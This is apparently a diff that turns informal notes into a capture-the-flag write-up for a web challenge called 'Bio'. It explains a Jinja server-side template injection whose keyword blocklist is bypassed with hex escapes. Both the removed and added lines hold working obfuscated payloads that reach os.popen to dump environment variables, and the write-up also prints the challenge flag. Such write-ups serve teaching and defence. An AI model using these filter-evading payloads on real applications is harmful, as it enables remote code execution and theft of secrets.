@@ -1,14 +1,54 @@
-firt :
-get the class name and their index which they have os in __init__.__globals__ :
-payload="""{% for c in ''['\x5f\x5f\x63\x6c\x61\x73\x73\x5f\x5f']['\x5f\x5f\x6d\x72\x6f\x5f\x5f'][1]['\x5f\x5f\x73\x75\x62\x63\x6c\x61\x73\x73\x65\x73\x5f\x5f']() %}
+---
+title: "Bio"
+ctf: "Friendly CTF 2026"
+date: 2026-09-28
+category: web
+difficulty: medium
+author: "L-BOH"
+---
+
+# Bio
+
+## Summary
+
+The profile bio has server-side template injection and a weak keyword blacklist. Hexadecimal escapes hide dangerous names from the filter but are decoded by Jinja.
+
+## Root cause
+
+The server checks the raw bio before injecting it into template source:
+
+~~~python
+if BLOCKLIST.search(new_bio):
+    return jsonify({"error": "Invalid input"}), 400
+...
+template = PROFILE_TEMPLATE.format(bio=bio)
+return render_template_string(template, user=user)
+~~~
+
+The blacklist runs before Jinja decodes string escapes. For example, the raw characters \x5f do not match an underscore check, but Jinja later interprets them as underscores. The render function then evaluates the reconstructed template syntax.
+
+## Vulnerability
+
+Raw payloads containing double underscores or the word os are rejected. However, Jinja understands escapes such as \x5f for underscore and \x6f\x73 for os. The filter sees only harmless backslash characters and letters before Jinja interprets the payload.
+
+## Exploit
+
+Register and log in, then submit this as the bio:
+
+~~~jinja
+{% for c in ''['\x5f\x5f\x63\x6c\x61\x73\x73\x5f\x5f']['\x5f\x5f\x6d\x72\x6f\x5f\x5f'][1]['\x5f\x5f\x73\x75\x62\x63\x6c\x61\x73\x73\x65\x73\x5f\x5f']() %}
 {% set g = c['\x5f\x5f\x69\x6e\x69\x74\x5f\x5f']|attr('\x5f\x5f\x67\x6c\x6f\x62\x61\x6c\x73\x5f\x5f') %}
 {% if g is not undefined and '\x6f\x73' in g %}
-{{ loop.index0 }}: {{ c['\x5f\x5f\x6e\x61\x6d\x65\x5f\x5f'] }}
+{{ g['\x6f\x73']['\x70\x6f\x70\x65\x6e']('printenv').read() }}
 {% endif %}
-{% endfor %}"""
+{% endfor %}
+~~~
 
-then the payload to get the env var where flag is :
-payload ="""{{ ''['\x5f\x5f\x63\x6c\x61\x73\x73\x5f\x5f']['\x5f\x5f\x6d\x72\x6f\x5f\x5f'][1]['\x5f\x5f\x73\x75\x62\x63\x6c\x61\x73\x73\x65\x73\x5f\x5f']()[{index}]['\x5f\x5f\x69\x6e\x69\x74\x5f\x5f']['\x5f\x5f\x67\x6c\x6f\x62\x61\x6c\x73\x5f\x5f']['\x6f\x73']['\x70\x6f\x70\x65\x6e']('env').read() }}"""
+The payload finds a Python class whose initializer exposes os in its globals, then runs printenv. Reload the profile and read FLAG from the displayed environment.
 
-and actually u can from the start when u doing the for loop , after the if condition u can execute ur desired command directly instead of getting the class name and index but this will print u many line since the class are many and so the command will be executed many times :
-payload="""{% for c in ''['\x5f\x5f\x63\x6c\x61\x73\x73\x5f\x5f']['\x5f\x5f\x6d\x72\x6f\x5f\x5f'][1]['\x5f\x5f\x73\x75\x62\x63\x6c\x61\x73\x73\x65\x73\x5f\x5f']() %}{% if '\x6f\x73' in c['\x5f\x5f\x69\x6e\x69\x74\x5f\x5f']['\x5f\x5f\x67\x6c\x6f\x62\x61\x6c\x73\x5f\x5f'] %}{{ c['\x5f\x5f\x69\x6e\x69\x74\x5f\x5f']['\x5f\x5f\x67\x6c\x6f\x62\x61\x6c\x73\x5f\x5f']['\x6f\x73']['\x70\x6f\x70\x65\x6e']('env').read() }}{% endif %}{% endfor %}"""
+
+## Flag
+
+~~~text
+Securinets{ssti_w1th_h3x_3ncod1ng_byp4ss}
+~~~
